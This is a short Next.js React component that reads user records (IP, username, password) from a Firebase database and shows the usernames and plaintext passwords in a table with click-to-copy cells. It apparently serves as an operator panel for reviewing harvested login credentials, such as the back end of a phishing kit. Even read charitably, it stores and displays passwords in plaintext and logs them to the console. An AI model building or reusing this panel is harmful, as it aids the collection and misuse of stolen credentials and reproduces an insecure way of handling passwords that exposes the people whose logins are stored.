"use client";

import { database } from "@/firebase";
import { onValue, ref } from "firebase/database";
import { useEffect, useState } from "react";

interface IList {
  [key: string]: {
    ip: string;
    username: string;
    password: string;
  };
}

export default function List() {
  const [data, setData] = useState<IList>({});

  useEffect(() => {
    const infosRef = ref(database, "users");

    onValue(infosRef, (snap) => {
      console.log(snap.val());

      const dataRef = snap.val();

      const keys = Object.keys(dataRef).reverse();

      const data: IList = {};

      keys.forEach((key) => {
        data[key] = dataRef[key];
      });

      setData((prev) => {
        // prev[]

        return { ...data };
      });
    });
  }, []);

  return (
    <>
      <div className="flex w-full h-[100vh] bg-zinc-800 flex-col px-4 py-4">
        <div className="relative overflow-x-auto">
          <table className="w-full text-sm text-left rtl:text-right text-gray-500 dark:text-gray-400">
            <thead className="text-xs uppercase bg-gray-700 text-gray-400">
              <tr>
                {/* <th scope="col" className="px-6 py-3">
                  IP
                </th> */}
                <th scope="col" className="px-6 py-3">
                  Username
                </th>
                <th scope="col" className="px-6 py-3">
                  Password
                </th>
              </tr>
            </thead>
            <tbody>
              {Object.keys(data).map((key) => {
                return (
                  <>
                    <tr className=" border-b bg-gray-800 border-gray-700">
                      <td className="px-6 py-4 text-white font-semibold">
                        <TdCopy data={data[key].username} />
                      </td>
                      <td className="px-6 py-4 text-white font-semibold">
                        <TdCopy data={data[key].password} />
                      </td>
                    </tr>
                  </>
                );
              })}
            </tbody>
          </table>
        </div>
      </div>
    </>
  );
}

const TdCopy = ({ data }: { data: string }) => {
  return (
    <>
      <td
        onClick={() => navigator.clipboard.writeText(data)}
        className="px-6 py-4 text-white font-semibold cursor-pointer"
      >
        {data}
      </td>
    </>
  );
};
